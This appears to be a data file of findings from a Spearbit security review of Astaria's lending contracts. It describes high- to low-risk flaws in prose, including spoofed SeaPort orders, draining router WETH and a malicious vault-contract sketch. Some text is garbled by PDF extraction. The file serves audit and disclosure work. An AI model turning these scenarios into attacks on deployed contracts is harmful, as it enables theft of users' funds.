        "body": "Anyone can create a SeaPort order with one of the considerations' recipients set to a ClearingHouse with a collateralId that is genuinely already set for auction. Once the spoofed order settles, SeaPort calls into this fallback function and causes the genuine Astaria auction to settle. This allows an attacker to set random items on sale on SeaPort with funds directed here (small buying prices) to settle genuine Astaria auctions on the protocol. This causes:  The Astaria auction payees and the liquidator would not receive what they would expect that should come from the auction. And if payee is a public vault it would introduce incorrect parameters into its system.  Lien data (s.lienMeta[lid]) and the lien token get deleted/burnt.  Collateral token and data get burnt/deleted.  When the actual genuine auction settles and calls back s.collateralIdToAuction[collateralId] check. to here, it will revert due to",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "c.lienRequest.strategy.vault is not checked to be a registered vault when commitToLiens is called",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "mentation(c.lienRequest.strategy.vault).commitToLien( ... ) of c.lienRequest.strategy.vault is not checked whether it is a registered vault within the system (by checking s.vaults). The caller can set this value to any address they would desire and potentially perform some unwanted actions. For example, the user could spoof all the values in commitments so that the later dependant contracts' checks are skipped and lastly we end up transferring funds: value after and the s.TRANSFER_PROXY.tokenTransferFrom( address(s.WETH), address(this), // <--- AstariaRouter address(msg.sender), totalBorrowed ); Not that since all checks are skipped, the caller can also indirectly set totalBorrowed to any value they would desire. And so, if AstariaRouter would hold any wETH at any point in time. Anyone can craft a payload to commitToLiens to drain its wETH balance.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Anyone can take a loan out on behalf of any collateral holder at any terms",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In the _validateCommitment() function, the initial checks are intended to ensure that the caller who is requesting the lien is someone who should have access to the collateral that it's being taken out against. The caller also inputs a receiver, who will be receiving the lien. In this validation, this receiver is checked against the collateral holder, and the validation is approved in the case that receiver == holder. However, this does not imply that the collateral holder wants to take this loan. This opens the door to a malicious lender pushing unwanted loans on holders of collateral by calling commitToLien with their collateralId, as well as their address set to the receiver. This will pass the receiver == holder check and execute the loan. In the best case, the borrower discovers this and quickly repays the loan, incurring a fee and small amount of interest. In the worst case, the borrower doesn't know this happens, and their collateral is liquidated.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Strategist Interest Rewards will be 10x higher than expected due to incorrect divisor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "VAULT_FEE is set as an immutable argument in the construction of new vaults, and is intended to be set in basis points. However, when the strategist interest rewards are calculated in _handleStrategistIntere- stReward(), the VAULT_FEE is only divided by 1000. The result is that the fee calculated by the function will be 10x higher than expected, and the strategist will be dramatically overpaid.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "The lower bound for liquidationInitialAsk for new lines needs to be stricter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "params.lien.details.liquidationInitialAsk ( Lnew ) is only compared to params.amount ( Anew ) whereas in _appendStack newStack[j].lien.details.liquidationInitialAsk ( Lj ) is compared to poten- tialDebt. potentialDebt is the aggregated sum of all potential owed amount at the end of each position/lien. So in _appendStack we have: onew + on + (cid:1) (cid:1) (cid:1) + oj (cid:20) Lj Where oj potential interest at the end of its term. is _getOwed(newStack[j], newStack[j].point.end) which is the amount for the stack slot plus the So it would make sense to enforce a stricter inequality for Lnew : (1 + r (tend (cid:0) tnow ) 1018 )Anew = onew (cid:20) Lnew The big issue regarding the current lower bound is when the borrower only takes one lien and for this lien liqui- dationInitialAsk == amount (or they are close). Then at any point during the lien term (maybe very close to the end), the borrower can atomically self liquidate and settle the Seaport auction in one transaction. This way the borrower can skip paying any interest (they would need to pay OpenSea fees and potentially royalty fees) and plus they would receive liquidation fees.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "commitToLiens transfers extra assets to the borrower when protocol fee is present",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "totalBorrowed is the sum of all commitments[i].lienRequest.amount But if s.feeTo is set, some of funds/assets from the vaults get transefered to s.feeTo when _handleProtocolFee is called and only the remaining is sent to the ROUTER(). So in this scenario, the total amount of assets sent to ROUTER() (so that it can be transferred to msg.sender) is up to rounding errors: (1 (cid:0) np dp )T Where:  T is the totalBorrowed  np is s.protocolFeeNumerator  dp is s.protocolFeeDenominator But we are transferring T to msg.sender which is more than we are supposed to send,",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Withdraw proxy's claim() endpoint updates public vault's yIntercept incorrectly.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Let parameter description y0 n En(cid:0)1 Bn(cid:0)1 Wn(cid:0)1 Sn(cid:0)1 Sv Bv V the yIntercept of our public vault in the question. the current epoch for the public vault. the expected storage parameter of the previous withdraw proxy. the asset balance of the previous withdraw proxy. the withdrawReserveReceived of the previous withdraw proxy. the total supply of the previous withdraw proxy. the total supply of the public vault when processEpoch() was last called on the public vault. the total balance of the public vault when processEpoch() was last called on the public vault. the public vault. 28 parameter description Pn(cid:0)1 the previous withdraw proxy. Then y0 is updated/decremented according to the formula (up to rounding errors due to division): y0 = y0 (cid:0) max(0, En(cid:0)1 (cid:0) (Bn(cid:0)1 (cid:0) Wn(cid:0)1))(1 (cid:0) Sn(cid:0)1 Sv ) Whereas the amount ( A ) of assets transfered from Pn(cid:0)1 to V is And the amount ( B ) of asset left in Pn(cid:0)1 after this transfer would be: A = (Bn(cid:0)1 (cid:0) Wn(cid:0)1)(1 (cid:0) Sn(cid:0)1 Sv ) B = Wn(cid:0)1 + (Bn(cid:0)1 (cid:0) Wn(cid:0)1) Sn(cid:0)1 Sv (cid:1) (Bn(cid:0)1 (cid:0) Wn(cid:0)1) is supposed to represent the payment withdrawal proxy receives from Seaport auctions plus the amount of assets transferred to it by external actors. So A represents the portion of this amount for users who have not withdrawn from the public vault on the previous epoch and it is transferred to V and so y0 should be compensated positively. Also note that this amount might be bigger than En(cid:0)1 if a lien has a really high liquida- tionInitialAsk and its auction fulfills/matches near that price on Seaport. So it is possible that En(cid:0)1 < A. The current update formula for updating the y0 has the following flaws:  It only considers updating y0 when En(cid:0)1 (cid:0) (Bn(cid:0)1 (cid:0) Wn(cid:0)1) > 0 which is not always the case.  Decrements y0 by a portion of En(cid:0)1. The correct updating formula for y0 should be: y0 = y0 (cid:0) En(cid:0)1 + (Bn(cid:0)1 (cid:0) Wn(cid:0)1)(1 (cid:0) Sn(cid:0)1 Sv ) Also note, if we let Bn(cid:0)1 (cid:0) Wn(cid:0)1 = Xn(cid:0)1 + (cid:15), where Xn(cid:0)1 is the payment received by the withdraw proxy from Seaport auction payments and (cid:15) (if Wn(cid:0)1 updated correctly) be assets received from external actors by the previous withdraw proxy. Then: B = Wn(cid:0)1 + (Xn(cid:0)1 + (cid:15)) Sn(cid:0)1 Sv (cid:1) = h max(0, Bv (cid:0) En(cid:0)1) + Xn(cid:0)1 + (cid:15) i Sn(cid:0)1 Sv (cid:1) The last equality comes from the fact that when the withdraw reserves is fully transferred from the public vault and the current withdraw proxy (if necessary) to the previous withdraw proxy the amount Wn(cid:0)1 would hold should be max(0, Bv (cid:0) En(cid:0)1) Sn(cid:0)1 . Sv (cid:1) Related Issue.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Public vault's yIntercept is not updated when the full amount owed is not paid out by a Seaport auction.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When the full amountOwed for a lien is not paid out during the callback from Seaport to a collateral's ClearingHouse and if the payee is a public vault, we would need to decrement the yIntercept, otherwise the payee.totalAssets() would reflect a wrong value.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "LienToken payee not reset on transfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "payee and ownerOf are detached in that owners may set payee and owner may transfer the LienTo- ken to a new owner. payee does not reset on transfer. Exploit scenario:  Owner of a LienToken sets themselves as payee  Owner of LienToken sells the lien to a new owner  New owner does not update payee  Payments go to address set by old owner",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "WithdrawProxy allows redemptions before PublicVault calls transferWithdrawReserve",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Anytime there is a withdraw pending (i.e. someone holds WithdrawProxy shares), shares may be redeemed so long as totalAssets() > 0 and s.finalAuctionEnd == 0. Under normal operating conditions totalAssets() becomes greater than 0 when then PublicVault calls trans- ferWithdrawReserve. totalAssets() can also be increased to a non zero value by anyone transferring WETH to the contract. If this occurs and a user attempts to redeem, they will receive a smaller share than they are owed. Exploit scenario:  Depositor redeems from PublicVault and receives WithdrawProxy shares.  Malicious actor deposits a small amount of WETH into the WithdrawProxy.  Depositor accidentally redeems, or is tricked into redeeming, from the WithdrawProxy while totalAssets() is smaller than it should be.  PublicVault properly processes epoch and full withdrawReserve is sent to WithdrawProxy.  All remaining holders of WithdrawProxy shares receive an outsized share as the previous shares we re- deemed for the incorrect value.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Point.position is not updated for stack slots in _removeStackPosition",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "uint8(params.stack.length) which would be its index in the stack. When _removeStackPosition is called to remove a slot newStack[i].point.position is not updated for indexes that are greater than position in the original stack. Also slot.point.position is only used when we emit AddLien and LienStackUpdated events. In both of those cases, we could have used params.stack.length",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "unchecked may cause under/overflows",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "unchecked should only be used when there is a guarantee of no underflows or overflows, or when they are taken into account. In absence of certainty, it's better to avoid unchecked to favor correctness over gas efficiency. For instance, if by error, protocolFeeNumerator is set to be greater than protocolFeeDenominator, this block in _handleProtocolFee() will underflow: PublicVault.sol#L640, unchecked { amount -= fee; } However, later this reverts due to the ERC20 transfer of an unusually high amount. This is just to demonstrate that unknown bugs can lead to under/overflows.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk PublicVault.sol#L563, LienToken.sol#L424, LienToken.sol#L482, PublicVault.sol#L376, PublicVault.sol#L422, Public-"
        ]
    },
    {
        "title": "Multiple ERC4626Router and ERC4626RouterBase functions will always revert",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The intention of the ERC4626Router.sol functions is that they are approval-less ways to deposit and redeem: // For the below, no approval needed, assumes vault is already max approved As long as the user has approved the TRANSFER_PROXY for WETH, this works for the depositToVault function:  WETH is transferred from user to the router with pullTokens.  The router approves the vault for the correct amount of WETH.  vault.deposit() is called, which uses safeTransferFrom to transfer WETH from router into vault. However, for the redeemMax function, it doesn't work:  Approves the vault to spend the router's WETH.  vault.redeem() is called, which tries to transfer vault tokens from the router to the vault, and then mints withdraw proxy tokens to the receiver. This error happens assuming that the vault tokens would be burned, in which case the logic would work. But since they are transferred into the vault until the end of the epoch, we require approvals. The same issue also exists in these two functions in ERC4626RouterBase.sol:  redeem(): this is where the incorrect approval lives, so the same issue occurs when it is called directly.  withdraw(): the same faulty approval exists in this function.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "UniV3 tokens with fees can bypass strategist checks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Each UniV3 strategy includes a value for fee in nlrDetails that is used to constrain their strategy to UniV3 pools with matching fees. This is enforced with the following check (where details.fee is the strategist's set fee, and fee is the fee returned from Uniswap): if (details.fee != uint24(0) && fee != details.fee) { revert InvalidFee(); } 33 This means that if you set details.fee to 0, this check will pass, even if the real fee is greater than zero.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "If auction time is reduced, withdrawProxy can lock funds from final auctions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When a new liquidation happens, the withdrawProxy sets s.finalAuctionEnd to be equal to the new incoming auction end. This will usually be fine, because new auctions start later than old auctions, and they all have the same length. However, if the auction time is reduced on the Router, it is possible for a new auction to have an end time that is sooner than an old auction. The result will be that the WithdrawProxy is claimable before it should be, and then will lock and not allow anyone to claim the funds from the final auction.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "claim() will underflow and revert for all tokens without 18 decimals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In the claim() function, the amount to decrease the Y intercept of the vault is calculated as: (s.expected - balance).mulWadDown(10**ERC20(asset()).decimals() - s.withdrawRatio) s.withdrawRatio is represented as a WAD (18 decimals). As a result, using any token with a number of decimals under 17 (assuming the withdraw ratio is greater than 10%) will lead to an underflow and cause the function to revert. In this situation, the token's decimals don't matter. They are captured in the s.expected and balance, and are also the scale at which the vault's y-intercept is measured, so there's no need to adjust for them. Note: I know this isn't a risk in the current implementation, since it's WETH only, but since you are planning to generalize to accept all ERC20s, this is important.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Call to Royalty Engine can block NFT auction",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "_generateValidOrderParameters() calls ROYALTY_ENGINE.getRoyaltyView() twice. The first call is wrapped in a try/catch. This lets Astaria to continue even if the getRoyaltyView() reverts. However, the second call is not safe from this. Both these calls have the same parameters passed to it except the price (startingPrice vs endingPrice). case they are different, there exists a possibility that the second call can revert. In",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Expired liens taken from public vaults need to be liquidated otherwise processing an epoch halts/reverts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "s.epochData[s.currentEpoch].liensOpenForEpoch is decremented or is supposed to be decre- mented, when for a lien with an end that falls on this epoch:  The full payment has been made,  Or the lien is bought out by a lien that is from a different vault or ends at a higher epoch,  Or the lien is liquidated. If for some reason a lien expires and no one calls liquidate, then s.epochData[s.currentEpoch].liensOpenForEpoch > 0 will be true and processEpoch() would revert till someones calls liquidate. Note that a lien's end falling in the s.currentEpoch and timeToEpochEnd() == 0 imply that the lien is expired. 35",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "assets < s.depositCap invariant can be broken for public vaults with non-zero deposit caps",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The following check in mint / deposit does not take into consideration the new shares / amount sup- plied to the endpoint, since the yIntercept in totalAssets() is only updated after calling super.mint(shares, receiver) or super.deposit(amount, receiver) with the afterDeposit hook. uint256 assets = totalAssets(); if (s.depositCap != 0 && assets >= s.depositCap) { revert InvalidState(InvalidStates.DEPOSIT_CAP_EXCEEDED); } Thus the new shares or amount provided can be a really big number compared to s.depositCap, but the call will still go through.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "redeemFutureEpoch transfers the shares from the msg.sender to the vault instead of from the owner",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "redeemFutureEpoch transfers the vault shares from the msg.sender to the vault instead of from the owner.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Lien buyouts can push maxPotentialDebt over the limit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When a lien is bought out, _buyoutLien calls _getMaxPotentialDebtForCollateral to confirm that this number is lower than the maxPotentialDebt specified in the lien. However, this function is called with the existing stack, which hasn't yet replaced the lien with the new, bought out lien. Valid refinances can make the rate lower or the time longer. In the case that a lien was bought out for a longer duration, maxPotentialDebt will increase and could go over the limit specified in the lien.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Liens cannot be bought out once we've reached the maximum number of active liens on one collateral",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The buyoutLien function is intended to transfer ownership of a lien from one user to another. In practice, it creates a new lien by calling _createLien and then calls _replaceStackAtPositionWithNewLien to update the stack. In the _createLien function, there is a check to ensure we don't take out more than maxLiens against one piece of collateral: if (params.stack.length >= s.maxLiens) { revert InvalidState(InvalidStates.MAX_LIENS); } The result is that, when we already have maxLiens and we try to buy one out, this function will revert.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "First vault deposit can cause excessive rounding",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Aside from storage layout/getters, the context above notes the other major departure from Solmate's ERC4626 implementation. The modification requires the initial mint to cost 10 full WETH. 37 + + + function mint( uint256 shares, address receiver ) public virtual returns (uint256 assets) { // assets is 10e18, or 10 WETH, whenever totalSupply() == 0 assets = previewMint(shares); // No need to check for rounding error, previewMint rounds up. // Need to transfer before minting or ERC777s could reenter. // minter transfers 10 WETH to the vault ERC20(asset()).safeTransferFrom(msg.sender, address(this), assets); // shares received are based on user input _mint(receiver, shares); emit Deposit(msg.sender, receiver, assets, shares); afterDeposit(assets, shares); } Astaria highlighted that the code diff from Solmate is in relation to this finding from the previous Sherlock audit. However, deposit is still unchanged and the initial deposit may be 1 wei worth of WETH, in return for 1 wad worth of vault shares. Further, the previously cited issue may still surface by calling mint in a way that sets the price per share high (e.g. 10 shares for 10 WETH produces a price per of 1:1e18). Albeit, at a higher cost to the minter to set the initial price that high.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "When the collateral is listed on SeaPort by the borrower using listForSaleOnSeaport, when settled the liquidation fee will be sent to address(0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When the collateral s.auctionData[collateralId].liquidator (s.auctionData in general) will not be set and so it will be address(0) and thus the liquidatorPayment will be sent to address(0).",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "potentialDebt is not compared against a new lien's maxPotentialDebt in _appendStack",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In _appendStack, we have the following block: newStack = new Stack[](stack.length + 1); newStack[stack.length] = newSlot; uint256 potentialDebt = _getOwed(newSlot, newSlot.point.end); ... if ( stack.length > 0 && potentialDebt > newSlot.lien.details.maxPotentialDebt ) { revert InvalidState(InvalidStates.DEBT_LIMIT); } Note, we are only performing a comparison between newSlot.lien.details.maxPotentialDebt and poten- tialDebt when stack.length > 0. If _createLien is called with params.stack.length == 0, we would not perform this check and thus the input params is not fully checked for misconfiguration.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Previous withdraw proxy's withdrawReserveReceived is not updated when assets are drained from the current withdraw proxy to the previous",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When drain is called, we don't update the s.epochData[s.currentEpoch - 1]'s withdrawRe- serveReceived, this is in contrast to when withdraw reserves are transferred from the public vault to the withdraw proxy. This would unlink the previous withdraw proxy's withdrawReserveReceived storage parameter to the total amount of assets it has received from either the public vault or the current withdraw proxy. An actor can manipulate Bn(cid:0)1 (cid:0) Wn(cid:0)1's value by sending assets to the public vault and the current withdraw proxy before calling transferWithdrawReserve ( Bn(cid:0)1 is the previous withdraw proxy's asset balance, Wn(cid:0)1 is previous withdraw proxy's withdrawReserveReceived and n is public vault's epoch). Bn(cid:0)1 (cid:0) Wn(cid:0)1 should really represent the sum of all near-boundary auction payment's the previous withdraw proxy receives plus any assets that are transferred to it by an external actor. Related Issue 46.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Update solc version and use unchecked in Uniswap related libraries",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The highlighted libraries above are referenced from Uniswap codebase which is intended to work with Solidity compiler <0.8. These older versions have unchecked arithmetic by default and the code takes it into account. Astaria code is intended to work with Solidity compiler >=0.8 which doesn't have unchecked arithmetic by default. Hence, to port the code, it has to be turned on via unchecked keyword. For example, FullMathUniswap.mulDiv(type(uint).max, type(uint).max, type(uint).max) reverts for v0.8, and returns type(uint).max for older version.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "buyoutLien is prone to race conditions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "LienToken.buyoutLien and VaultImplementation.buyoutLien are both prone to race conditions where multiple vaults can try to front-run each others' buyoutLien call to end up registering their own lien. Also note, due to the storage values s.minInterestBPS and s.minDurationIncrease being used in the is- ValidRefinance, the winning buyoutLien call does not necessarily have to have the best rate or duration among the other candidates in the race.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "ERC20-Cloned allows certain actions for address(0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In ERC20-Cloned, address(0) can be used as the:  spender (spender)  to parameter of transferFrom.  to parameter of transfer.  to parameter of _mint.  from parameter of _burn. As an example, one can transfer or transferFrom to address(0) which would turn the amount of tokens unus- able but those not update the total supply in contrast to if _burn was called.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "BEACON_PROXY_IMPLEMENTATION and WETH cannot be updated for AstariaRouter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "There is no update mechanism for BEACON_PROXY_IMPLEMENTATION and WETH in AstariaRouter. It would make sense that one would want to keep WETH as not upgradable (unless we provide the wrong address to the constructor). But for BEACON_PROXY_IMPLEMENTATION there could be possibilities of potentially upgrading it.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Incorrect key parameter type is used for s.epochData",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In PublicVault, whenever the epoch key provided is to the mapping s.epochData its type is uint64, but the type of s.epochData is mapping(uint256 => EpochData)",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "buyoutLien, canLiquidate and makePayment have different notion of expired liens when considering edge cases",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When swapping a lien that is just expired (lien's end tend equals to the current timestamp tnow ), one can call buyoutLien to swap it out. But when tnow > tend , buyoutLien reverts due to the underflow in _- getRemainingInterest when calculating the buyout amount. This is in contrast to canLiquidate which allows a lien with tnow = tend to liquidate as well. makePayment also only considers tend < tnow as expired liens. So the expired/non-functional liens time ranges for different endpoints are: endpoint expired range buyoutLien canLiquidate makePayment (tend , 1) [tend , 1) (tend , 1)",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Ensure all ratios are less than 1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Although, numerators and denominators for different fees are set by admin, it's a good practice to add a check in the contract for absurd values. In this case, that would be when numerator is greater than denominator.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Factor out s.slope updates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Slope updates occur in multiple locations but do not emit events.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "External call to arbitrary address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The Router has a convenience function to commit to multiple liens AstariaRouter.commitToLiens. This function causes the router to receive WETH and allows the caller to supply an arbitrary vault address lien- Request.strategy.vault which is called by the router. This allows the potential for the caller to re-enter in the middle of the loop, and also allows them to drain any WETH that happens to be in the Router. In our review, no immediate reason for the Router to have WETH outside of commitToLiens calls was identified and therefore the severity of this finding is low.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Astaria's Seaport orders may not be listed on OpenSea",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "To list Seaport orders on OpenSea, the order should pass certain validations as described here(see OpenSea Order Validation). Currently, Astaria orders will fail this validation. For instance, zone and zoneHash values are not set as suggested.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Any ERC20 held in the Router can be stolen using ERC4626RouterBase functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "All four functions in ERC4626RouterBase.sol take in a vault address, a to address, a shares amount, and a maxAmountIn for validation. The first step is to read vault.asset() and then approve the vault to spend the ERC20 at whatever address is returned for the given amount. function mint( IERC4626 vault, address to, uint256 shares, uint256 maxAmountIn ) public payable virtual override returns (uint256 amountIn) { ERC20(vault.asset()).safeApprove(address(vault), shares); if ((amountIn = vault.mint(shares, to)) > maxAmountIn) { revert MaxAmountError(); } } In the event that the Router holds any ERC20, a malicious user can design a contract with the following functions: function asset() view pure returns (address) { return [ERC20 the router holds]; } function mint(uint shares, address to) view pure returns (uint) { return 0; } If this contract is passed as the vault, the function will pass, and the router will approve this contract to control its holdings of the given ERC20.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inconsistency in byte size of maxInterestRate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In RouterStorage, maxInterestRate has a size of uint88. However, when being set from file(), it is capped at uint48 by the safeCastTo48() function.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Router#file has update for nonexistent MinInterestRate variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "One of the options in the file() function is to update FileType.MinInterestRate. There are two problems here: 1) If someone chooses this FileType, the update actually happens to s.maxInterestRate. 2) There is no minInterestRate storage variable, as minInterestBPS is handled on L235-236.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "getLiquidationWithdrawRatio() and getYIntercept() have incorrect return types",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "liquidationWithdrawRatio and yIntercept like other amount-related parameters are of type uint88 (uint88) and they are the returned values of getLiquidationWithdrawRatio() and getYIntercept() re- spectively. But the return type of getLiquidationWithdrawRatio() and getYIntercept() are defined as uint256.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The modified implementation of redeem is omitting a check to make sure not to redeem 0 assets.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The modified implementation of redeem is omitting the check // Check for rounding error since we round down in previewRedeem. require((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\"); You can see a trail of it in redeemFutureEpoch.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "PublicVault's redeem and redeemFutureEpoch always returns 0 assets.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "assets returned by redeem and redeemFutureEpoch will always be 0, since it has not been set in redeemFutureEpoch. Also Withdraw event emits an incorrect value for asset because of this. The issue stems from trying to consolidate some of the logic for redeem and withdraw by using redeemFutureEpoch for both of them.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OWNER() cannot be updated for private or public vaults",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
